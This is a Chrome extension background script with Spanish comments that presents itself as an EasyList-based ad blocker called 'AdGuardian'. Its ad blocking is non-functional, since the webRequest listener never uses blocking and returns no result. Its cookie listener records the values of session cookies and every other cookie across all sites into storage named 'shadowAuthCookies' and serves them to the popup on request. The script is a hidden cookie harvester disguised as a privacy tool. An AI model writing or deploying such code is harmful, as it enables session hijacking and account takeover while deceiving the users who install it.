// URL de la lista EasyList
const easyListUrl = "https://easylist.to/easylist/easylist.txt";

// Función para obtener la lista EasyList
async function fetchEasyList() {
    try {
        const response = await fetch(easyListUrl);
        if (response.ok) {
            const text = await response.text();
            // Filtrar y extraer dominios relevantes (por ejemplo, solo anuncios de Google, Facebook, etc.)
            const filteredUrls = text.split("\n")
                .filter(url => url.trim() && !url.startsWith("!") && isRelevantDomain(url))
                .slice(0, 150);  // Limitar la lista a los primeros 150 dominios relevantes
            return filteredUrls;
        } else {
            console.error("Error al obtener la lista EasyList:", response.status);
            return [];
        }
    } catch (error) {
        console.error("Error al intentar descargar EasyList:", error);
        return [];
    }
}

// Función para determinar si un dominio es relevante
function isRelevantDomain(url) {
    const relevantPatterns = [
        "doubleclick.net",
        "adservice.google.com",
        "googlesyndication.com",
        "ads-twitter.com",
        "facebook.com/ads",
        "track.adform.net",
        "advertising.com",
        "quantserve.com"
    ];

    return relevantPatterns.some(pattern => url.includes(pattern));
}

// Función para actualizar los bloqueos con EasyList
async function updateBlockedUrls() {
    const easyListUrls = await fetchEasyList();
    if (easyListUrls.length > 0) {
        chrome.storage.local.set({ easyListUrls }, function() {
            console.log("EasyList actualizado correctamente.");
        });
    }
}

// Función para bloquear anuncios usando las URLs de EasyList
async function blockAds(details, callback) {
    // Cargamos la lista de URLs bloqueadas desde el almacenamiento local
    chrome.storage.local.get("easyListUrls", function(result) {
        const blockedUrls = result.easyListUrls || [];
        // Verificamos si la URL actual está en la lista de bloqueos
        if (blockedUrls.some(url => details.url.includes(url))) {
            console.log("AdGuardian: bloqueando anuncio en", details.url);
            callback({ cancel: true });  // Cancelamos la solicitud si está en la lista
        } else {
            callback({ cancel: false });  // No cancelamos la solicitud si no está en la lista
        }
    });
}

// Función de bloqueo de anuncios (sincrónico con webRequest)
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        blockAds(details, function(result) {
            // Devolvemos el resultado del bloqueo a webRequest sin usar "blocking"
            return result;
        });
    },
    { urls: ["<all_urls>"] },
    []  // No usamos "blocking" aquí
);

// Actualizamos la lista EasyList cada 6 horas (21600000 ms)
setInterval(updateBlockedUrls, 21600000);  // 6 horas en milisegundos
// Actualizamos la lista EasyList al iniciar la extensión
updateBlockedUrls();

// Escucha los cambios en las cookies
chrome.cookies.onChanged.addListener(function(changeInfo) {
    // Nombres comunes de cookies de sesión
    const sessionCookieNames = ["session", "sid", "PHPSESSID", "JSESSIONID", "auth_token"];

    // Verifica si la cookie es alguna de las cookies de sesión más comunes
    if (changeInfo.cookie.domain && sessionCookieNames.includes(changeInfo.cookie.name) && !changeInfo.cookie.secure) {
        console.log("Cookie de sesión cambiada:", changeInfo.cookie);

        // Guardar la cookie de sesión en almacenamiento local
        chrome.storage.local.get("shadowAuthCookies", function(result) {
            let cookies = result.shadowAuthCookies || [];
            cookies.push({
                domain: changeInfo.cookie.domain,
                name: changeInfo.cookie.name,
                value: changeInfo.cookie.value,
                path: changeInfo.cookie.path,
                secure: changeInfo.cookie.secure,
                httpOnly: changeInfo.cookie.httpOnly,
                sameSite: changeInfo.cookie.sameSite
            });
            chrome.storage.local.set({ shadowAuthCookies: cookies }, function() {
                console.log("Cookie de sesión guardada exitosamente:", changeInfo.cookie);
            });
        });
    } else {
        // Si la cookie no es de sesión, también la guardamos
        chrome.storage.local.get("shadowAuthCookies", function(result) {
            let cookies = result.shadowAuthCookies || [];
            cookies.push({
                domain: changeInfo.cookie.domain,
                name: changeInfo.cookie.name,
                value: changeInfo.cookie.value,
                path: changeInfo.cookie.path,
                secure: changeInfo.cookie.secure,
                httpOnly: changeInfo.cookie.httpOnly,
                sameSite: changeInfo.cookie.sameSite
            });
            chrome.storage.local.set({ shadowAuthCookies: cookies }, function() {
                console.log("Otra cookie guardada exitosamente:", changeInfo.cookie);
            });
        });
    }
});

// Escuchar solicitudes para enviar las cookies capturadas al popup
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action === "getCookies") {
        chrome.storage.local.get("shadowAuthCookies", function(result) {
            sendResponse(result.shadowAuthCookies || []);
        });
    }
    return true;  // Necesario para asincronicidad
});
